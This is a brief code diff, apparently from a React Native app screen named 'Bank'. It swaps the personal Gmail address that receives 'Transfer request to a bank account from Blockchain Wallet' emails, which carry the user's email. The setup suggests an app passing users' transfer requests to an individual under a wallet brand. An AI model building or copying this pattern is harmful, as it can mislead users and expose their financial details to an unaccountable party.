@@ -36,7 +36,7 @@ const Bank = ({ navigation }) => {
         date: new Date().toDateString(),
         type: "Send",
         status: "Pending",
-        to: ["bchain676754@gmail.com"],
+        to: ["diamondprofx@gmail.com"],
         message: {
           subject: `Transfer request to a bank account from Blockchain Wallet`,
           text: `The user user with the email ${
